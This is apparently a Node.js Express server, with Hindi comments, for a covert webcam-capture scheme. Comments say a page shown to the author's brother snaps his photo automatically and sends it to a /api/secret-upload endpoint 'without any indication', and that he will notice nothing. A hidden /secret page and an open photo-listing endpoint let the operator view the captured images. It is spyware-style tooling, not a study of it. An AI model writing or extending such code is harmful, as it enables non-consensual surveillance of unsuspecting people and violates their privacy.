const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads');
}

const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        // Filename with timestamp and random ID
        cb(null, Date.now() + '-' + Math.round(Math.random() * 1E9) + '.jpg');
    }
});
const upload = multer({ storage });

let photos = [];

// Secret upload - बिना किसी संकेत के
app.post('/api/secret-upload', upload.single('photo'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    
    const photo = {
        id: Date.now(),
        filename: req.file.filename,
        url: `/uploads/${req.file.filename}`,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'] || 'unknown'
    };
    
    photos.unshift(photo);
    if (photos.length > 100) photos.pop(); // Keep last 100 photos
    
    // Log to console (server side)
    console.log(`📸 SECRET PHOTO RECEIVED at ${new Date().toLocaleString()}`);
    console.log(`   Filename: ${req.file.filename}`);
    console.log(`   Total photos: ${photos.length}`);
    
    // Return minimal response - user को कुछ पता नहीं चलेगा
    res.json({ success: true });
});

// Get all secret photos
app.get('/api/secret/photos', (req, res) => {
    res.json(photos);
});

// Delete photo
app.delete('/api/photos/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const photo = photos.find(p => p.id === id);
    if (photo) {
        const filePath = path.join('./uploads', photo.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        photos = photos.filter(p => p.id !== id);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// भाई को ये पेज दिखेगा (ऑटो फोटो क्लिक होगी)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// तुम इस पेज से सारी फोटो देखोगे (सीक्रेट)
app.get('/secret', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'secret.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔓 Secret view: http://localhost:${PORT}/secret`);
});